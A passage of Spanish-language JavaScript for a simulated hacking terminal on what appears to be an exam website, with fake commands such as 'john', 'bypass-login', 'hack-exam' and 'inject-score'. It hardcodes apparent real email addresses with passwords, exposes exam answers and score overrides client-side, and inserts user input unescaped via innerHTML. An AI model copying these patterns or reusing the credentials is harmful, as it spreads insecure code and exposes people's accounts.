                    <span>${file}: <span class="terminal-warning">Todas las respuestas del examen están en /home/Mr.Robot/.hidden-backdoor/exam-answers.txt</span></span><br>
                </div>`;
            }
            
            return `<div class="terminal-command-output">
                <span>No se encontraron coincidencias para '${pattern}' en ${file}</span>
            </div>`;
        },
        
        'john': function(args) {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            if (args.length < 1) {
                return '<span class="terminal-error">Error: Uso correcto: john [archivo]</span>';
            }
            
            const file = args[0];
            
            if (file.includes(".passwd-hidden") || file.includes("passwd") || file.includes("shadow")) {
                return `<div class="terminal-command-output">
                    <span class="terminal-success">John the Ripper 1.9.0-jumbo-1</span><br>
                    <span>Analizando archivo ${file}...</span><br>
                    <span>Probando contraseñas comunes...</span><br>
                    <span class="terminal-success">Contraseña encontrada: root:01010</span><br>
                    <span class="terminal-success">Contraseña encontrada: user:usuario123</span><br>
                    <span>2 contraseñas crackeadas, 0 quedan pendientes</span>
                </div>`;
            } else {
                return `<div class="terminal-command-output">
                    <span class="terminal-error">Error: El archivo ${file} no contiene información de contraseñas o no existe</span><br>
                    <span>Sugerencia: Busca archivos ocultos con 'ls -la'</span>
                </div>`;
            }
        },
        
        'show-users': function() {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            return `<div class="terminal-command-output">
                <p class="terminal-success">Lista de usuarios y contraseñas:</p>
                <pre>
{
    "usuarios": [
        {
            "usuario": "Andres",
            "contrasena": "1724"
        },
        {
            "usuario": "sergio.sabogal0527@gmail.com",
            "contrasena": "CiberSergio27!"
        },
        {
            "usuario": "frandavhg@gmail.com",
            "contrasena": "CiberFranHG!"
        },
        {
            "usuario": "salamanca.andres@correounivalle.edu.co",
            "contrasena": "CiberAndresUV!"
        },
        {
            "usuario": "admin",
            "contrasena": "seguridad2023"
        },
        {
            "usuario": "Mr.Robot",
            "contrasena": "01010"
        }
        // ... más usuarios omitidos
    ]
}
                </pre>
            </div>`;
        },
        
        'show-answers': function() {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            // Generar HTML para respuestas de opción múltiple
            let multipleChoiceHTML = '<p class="terminal-success">Respuestas de opción múltiple:</p>';
            
            for (const [questionId, answer] of Object.entries(correctAnswers)) {
                multipleChoiceHTML += `<p>${questionId}: <span class="terminal-warning">${answer}</span></p>`;
            }
            
            // Generar HTML para respuestas abiertas
            let openAnswersHTML = '<p class="terminal-success">Respuestas para preguntas abiertas:</p>';
            
            for (const [questionId, answer] of Object.entries(openAnswers)) {
                openAnswersHTML += `<p>${questionId}:</p><pre class="terminal-warning">${answer}</pre>`;
            }
            
            return `<div class="terminal-command-output">
                ${multipleChoiceHTML}
                <br>
                ${openAnswersHTML}
            </div>`;
        },
        
        'bypass-login': function(args) {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            if (args.length < 2) {
                return '<span class="terminal-error">Error: Uso correcto: bypass-login [usuario] [contraseña]</span>';
            }
            
            const username = args[0];
            const password = args[1];
            
            // Almacenar información de sesión
            sessionStorage.setItem('isLoggedIn', 'true');
            sessionStorage.setItem('nombreUsuario', username);
            sessionStorage.setItem('nombreCompleto', username);
            sessionStorage.setItem('startTime', Date.now().toString());
            sessionStorage.setItem('bypassActivated', 'true');
            
            return `<span class="terminal-success">✓ Bypass exitoso. Iniciando sesión como ${username}...</span>
                   <script>setTimeout(() => { window.location.href = 'examen.html'; }, 1500);</script>`;
        },
        
        'hack-exam': function() {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            // Preparar para hackear el examen completo
            sessionStorage.setItem('isLoggedIn', 'true');
            sessionStorage.setItem('nombreUsuario', 'h4ck3r');
            sessionStorage.setItem('nombreCompleto', 'Elite Hacker');
            sessionStorage.setItem('startTime', Date.now().toString());
            sessionStorage.setItem('hackExamActivated', 'true');
            
            // Almacenar todas las respuestas correctas
            let allAnswers = {};
            
            // Añadir respuestas de opción múltiple
            for (const [questionId, answer] of Object.entries(correctAnswers)) {
                allAnswers[questionId] = answer;
            }
            
            // Añadir respuestas abiertas
            for (const [questionId, answer] of Object.entries(openAnswers)) {
                allAnswers[questionId] = answer;
            }
            
            // Guardar todas las respuestas
            sessionStorage.setItem('userAnswers', JSON.stringify(allAnswers));
            
            return `<span class="terminal-success">✓ Hack completo. Cargando examen con todas las respuestas...</span>
                   <script>setTimeout(() => { window.location.href = 'examen.html'; }, 1500);</script>`;
        },
        
        'inject-score': function(args) {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            if (!args[0] || isNaN(args[0])) {
                return '<span class="terminal-error">Error: Especifica una puntuación válida (0-100)</span>';
            }
            
            const score = parseFloat(args[0]);
            
            if (score < 0 || score > 100) {
                return '<span class="terminal-error">Error: La puntuación debe estar entre 0 y 100</span>';
            }
            
            sessionStorage.setItem('injectedScore', score.toString());
            
            return `<span class="terminal-success">✓ Puntuación ${score}% inyectada correctamente. Se aplicará en la evaluación final.</span>`;
        }
    };
    
    // Función auxiliar para traducir nombres de directorios
    function translateDirectoryName(name) {
        const translations = {
            "Desktop": "Escritorio",
            "Documents": "Documentos",
            "Downloads": "Descargas",
            "home": "home",
            "Escritorio": "Escritorio",
            "Documentos": "Documentos",
            "Descargas": "Descargas"
        };
        
        return translations[name] || name;
    }
    
    // Procesar comandos
    function processCommand(cmd) {
        // Si estamos esperando la contraseña de root
        if (waitingForRootPassword) {
            waitingForRootPassword = false;
            
            if (cmd === '01010') {
                isRootAuthenticated = true;
                currentDirectory = "/home/Mr.Robot";
                updatePrompt();
                return '<span class="terminal-success">Autenticación exitosa. Privilegios de root activados.</span><br><span class="terminal-info">Ahora puedes acceder a todos los directorios y comandos de hackeo.</span><br><span class="terminal-warning">SUGERENCIA: Ve al escritorio con "cd Escritorio" para ver el archivo hackme.txt</span>';
            } else {
                return '<span class="terminal-error">Autenticación fallida: Contraseña incorrecta</span><br><span class="terminal-info">La contraseña está oculta en alguna carpeta del material.</span>';
            }
        }
        
        // Dividir comando y argumentos
        const parts = cmd.trim().split(' ');
        const command = parts[0].toLowerCase();
        const args = parts.slice(1);
        
        // Comandos especiales con espacios
        if (cmd.trim().toLowerCase() === 'uname -a') {
            return commands['uname -a']();
        }
        
        if (cmd.trim().toLowerCase() === 'ps aux') {
            return commands['ps aux']();
        }
        
        if (cmd.trim().toLowerCase().startsWith('find ')) {
            return commands['find'](args);
        }
        
        if (cmd.trim().toLowerCase().startsWith('grep ')) {
            return commands['grep'](args);
        }
        
        // Comandos disponibles sin autenticación: su, clear, ls, cd, pwd, cat, help, whoami, date
        const basicCommands = ['su', 'clear', 'ls', 'cd', 'pwd', 'cat', 'help', 'whoami', 'date'];
        if (basicCommands.includes(command)) {
            return commands[command](args);
        }
        
        // Para otros comandos, verificar autenticación
        if (!isRootAuthenticated && command !== '') {
            return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar comandos avanzados. Utiliza "su root" primero.</span>';
        }
        
        // Ejecutar el comando si existe
        if (commands[command]) {
            return commands[command](args);
        } else if (command !== '') {
            // Intentar sugerir un comando similar
            const availableCommands = Object.keys(commands);
            const similarCommands = availableCommands.filter(cmd => cmd.includes(command));
            
            if (similarCommands.length > 0) {
                return `<span class="terminal-error">Error: Comando '${command}' no reconocido. ¿Quizás quisiste decir '${similarCommands[0]}'?</span>`;
            }
            
            return `<span class="terminal-error">Error: Comando '${command}' no reconocido. Escribe 'help' para ver comandos disponibles.</span>`;
        }
        return '';
    }
    
    // Añadir línea de comando y su resultado al terminal
    function addCommandLine(cmd, output) {
        const commandElement = document.createElement('div');
        commandElement.className = 'terminal-command';
        commandElement.innerHTML = `<span class="terminal-prompt">${rootPrompt}</span> <span class="terminal-command-text">${cmd}</span>`;
        
        terminalOutput.appendChild(commandElement);
        
        if (output) {
            const outputElement = document.createElement('div');
            outputElement.className = 'terminal-output-result';
            outputElement.innerHTML = output;
            terminalOutput.appendChild(outputElement);
        }
        
        // Hacer scroll al final de manera más confiable
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }
    
    // Event listener para el input
    terminalInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            
            const cmd = terminalInput.value;
            terminalInput.value = '';
            
            if (cmd.trim() || waitingForRootPassword) {
                // No mostrar la contraseña en la terminal por seguridad
                if (waitingForRootPassword) {
                    // Mostrar asteriscos en lugar de la contraseña real
                    const commandElement = document.createElement('div');
                    commandElement.className = 'terminal-command';
                    commandElement.innerHTML = `<span class="terminal-prompt">${rootPrompt}</span> <span class="terminal-command-text">********</span>`;
                    terminalOutput.appendChild(commandElement);
                    
                    // Procesar y mostrar resultado
                    const output = processCommand(cmd);
                    if (output) {
                        const outputElement = document.createElement('div');
                        outputElement.className = 'terminal-output-result';
                        outputElement.innerHTML = output;
                        terminalOutput.appendChild(outputElement);
                    }
                } else {
                    // Agregar al historial (excepto contraseñas)
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                    
                    // Crear el elemento para el comando
                    const commandElement = document.createElement('div');
                    commandElement.className = 'terminal-command';
                    commandElement.innerHTML = `<span class="terminal-prompt">${rootPrompt}</span> <span class="terminal-command-text">${cmd}</span>`;
                    terminalOutput.appendChild(commandElement);
                    
                    // Procesar y mostrar resultado
                    const output = processCommand(cmd);
                    if (output) {
                        const outputElement = document.createElement('div');
                        outputElement.className = 'terminal-output-result';
                        outputElement.innerHTML = output;
                        terminalOutput.appendChild(outputElement);
                    }
                }
                
                // Actualizar el prompt si cambia el estado de autenticación
                document.querySelector('.terminal-input-line .terminal-prompt').textContent = rootPrompt;
                
                // Asegurar que siempre se desplace al último comando
                setTimeout(() => {
                    terminalBody.scrollTop = terminalBody.scrollHeight;
                }, 10);
            }
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            
            if (historyIndex > 0) {
                historyIndex--;
                terminalInput.value = commandHistory[historyIndex];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                terminalInput.value = commandHistory[historyIndex];
            } else {
                historyIndex = commandHistory.length;
                terminalInput.value = '';
            }
        } else if (e.key === 'Tab') {
            e.preventDefault();
            
            // Auto-completar comandos básicos
            const currentText = terminalInput.value.toLowerCase();
            const allCommands = Object.keys(commands);
            
            const possibleCompletions = allCommands.filter(cmd => cmd.startsWith(currentText));
            
            if (possibleCompletions.length === 1) {
                terminalInput.value = possibleCompletions[0];
            } else if (possibleCompletions.length > 0) {
                addCommandLine(currentText, possibleCompletions.join('  '));
            }
        }
    });
    
    // Hacer variables disponibles globalmente para el script inyectado
    window.isRootAuthenticated = isRootAuthenticated;
    window.rootPrompt = rootPrompt;
    
    // Auto focus en el input cuando la terminal está abierta
    terminalWindow.addEventListener('click', function() {
        terminalInput.focus();
    });
}); 